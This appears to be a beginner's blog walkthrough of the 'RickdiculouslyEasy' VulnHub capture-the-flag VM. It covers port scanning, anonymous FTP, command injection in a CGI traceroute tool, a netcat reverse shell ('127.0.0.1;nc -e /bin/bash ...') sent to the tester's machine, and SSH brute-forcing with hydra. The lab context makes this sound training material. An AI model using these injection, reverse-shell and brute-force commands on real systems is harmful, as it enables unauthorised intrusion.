---
title: "Pentest: owning rick and morty VM"
categories:
  - Penetration-Testing
tags:
  - Pentest
  - ctf
  - exploits
---
My collegues told me about vulnhub, a website for peneteration tester to test their skills on boot2root VM's.
On the site you'll find multiple boxes, with various difficulty levels. Since I just started out, I tried to find an easy VM to test out my skills.
Quickly, I found the rick and morty VM, being a huge fan of the show, I wanted to have a look at it.
[You can find the VM here:](https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/)
A lot of vulnhub machines work with a capture the flag system, which means there are several files aka "flags" hidden in the machine, your goal is to collect them all. According to the discription this VM has 130 points worth of flags, our objective is to collect all points, and eventually get root access along the way...

**disclaimer: I'm a beginning peneteration tester so there are probably more efficient ways of owning this VM.**

### How I tackled this VM.

The first thing I did was do an nmap scan of the VM to find all open ports and hopefully some services.

` nmap 10.0.2.12 -p- -sV`

this gave us the following open ports and services:

```
PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 3.0.3
22/tcp open ssh?
80/tcp open http Apache httpd 2.4.27 ((Fedora))
9090/tcp open http Cockpit web service
13337/tcp open unknown
22222/tcp open ssh OpenSSH 7.5 (protocol 2.0)
60000/tcp open unknown

```

A good amount of open ports were found, now is the time to check them out:
* I started with the open ports I've never seen before which were 13337 & 60000:

  `nc 10.0.2.12 1337`
We found our first flag worth 10 points! only 120 points more to go...

* After finding that flag I switched to port 60000:

  `nc 10.0.2.12 60000`

This gave me some sort of shell, but with very little commands that could be used
I used `ls` and saw a FLAG.txt file `cat` revealed the content, it's worth 10 points! 110 more to go


* After this I checked port 9090, being a http protocol, I used my webbrowser:
  another flag found! 10 points, 30 down, 100 to go...

* Time to check the FTP connection
  `ftp 10.0.2.12`
  I tried the anonymous user and empty password in case it was using anonymous FTP, turns out that was a good call because I got in!
  there was a flag file present, again worth 10 points, so we already have 40 points and didn't even take a look at the web application yet..


* I accessed the website in my browser, being greeted by morty but other than that nothing special,...
  Time to use `dirb` to crawl the webpage and show any hidden folders:
  `dirb http://10.0.2.12`

  This showed me there was a `/cgi-bin/` folder present
  I browsed it and saw two tools there /cgi-bin/root_shell.cgi and tracertool.cgi

  Really? root_shell.cgi? after checking it out, it turned out to be trolling me.
  Let's take a look at the tracertool instead...

  This turned out to be a legit tool, filling in an ip did indeed do a tracert, this gave me an indication that OS commands where being used in this application, so I tried to just do `ls` instead of filling in an ip, this did not work, which is obvious because it's running a tracert, tracert ls won't work..
  So I tried the following: `127.0.0.1;ls` This worked! I got the contents of the current directory, I tried to exploit this further by checking if a tool called `netcad` was installed: `127.0.0.1;nc -h` turns out that it was indeed installed.

  Time to try and setup a shell to my kali machine, so I started a listener on my normal machine

  `nc -lvp <port to listen to>`

  and on the webtool I issued: `127.0.0.1;nc -e /bin/bash 10.0.2.10 <port> `

  Try and play with the ports to see if one works, I used port 4444

  et voila! We have a shell into the webserver ;)

  time to poke around a bit:
  going into the html folder and doing an `ls -lah` showed me a passwords folder!
  going to 10.0.2.12/passwords/ in the webbrowser revealed a flag, giving us another 10 points! We now have a total of 50 points
  There is a passwords.html page, this doesn't show much, but there is a comment from Rick saying he hid something but did not delete it, so I checked the source code and indeed, there was a password there called winter

  Now we have a password, but we don't know any users yet... lets try and `cat /etc/passwd` to see all users on this machine
  And we get trolled, the `cat` command got replaced to show us an ASCII cat.. awesome...
  `vi /etc/passwd` works.

   We see users called Summer,RickSanchez and Morty

* Winter is the last name of Summer in the show, so let's try SSH `ssh Summer@10.0.2.12 -p 22222` password Winter and voila, we are logged in with SSH onto the machine, we don't need our shell we established with the web vulnerability anymore, and another flag is waiting in Summers homedir, sweet!
10 points, 60 in total, going strong!

  I also found out using `ls -lah ` that Summer has read access to the other users directories, so naturally it's time to take a peek:
  Morty had some cool files in his directory, because the box we are in has limited tools, i copyed them over to my own machine using `scp -P 22222 Summer@10.0.2.12:/home/Morty/Safe_Password.jpg .` it's an image file and images have exif data, there is a password there!
  the password is Meeseek, I doubt that Rick or even Morty use Meeseek as password, there was also a file called journal.txt.zip
  I copied this over with `scp` using the same method as described above.
  trying to unzip this file prompts me for a password, I typed in Meeseek and I got in
  reading the journal gave us the flag 131333 worth 20 points, bringing our total to 80 already.
  In the journal morty talked about rick brabelling about a safe, and when checking Rick's direcotry there is indeed a safe, we copy it to our machine and execute it with the password 131333 and we get a message from Rick:


```
(This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
Follow these clues, in order
1 uppercase character
1 digit
One of the words in my old bands name.

```
And we also got a flag worth another 20 points, bringing our points to 100, we are now close to the end!
If you don't watch Rick and Morty you can google what Rick's band name was, spoiler: it's called The Flesh Curtains
It's time to create a wordlist with the above specifics, you can tackle this by making your own script
which could look like this:

```
from string import ascii_uppercase
for c in ascii_uppercase:
    for x in range(0, 10):
        print str(c) + str(x) + "Flesh"
        print str(c) + str(x) + "Curtains"
```

or you could just use crunch and be lazy :)

```
crunch 10 10 -t ,%Curtains -o ./wordlist.curtains
crunch 7 7 -t ,%Flesh -o ./wordlist.flesh
cat wordlist.curtains > wordlist
cat wordlist.flesh >> wordlist
```

Time to use Hydra and do a brute force attack!

`hydra -l RickSanchez -P wordlist ssh://192.168.56.102 -s 22222`

running this will give you the password (I'm not spoiling this one, do it yourself!)

Rick can escalate to root, and in root is the last flag! :) 
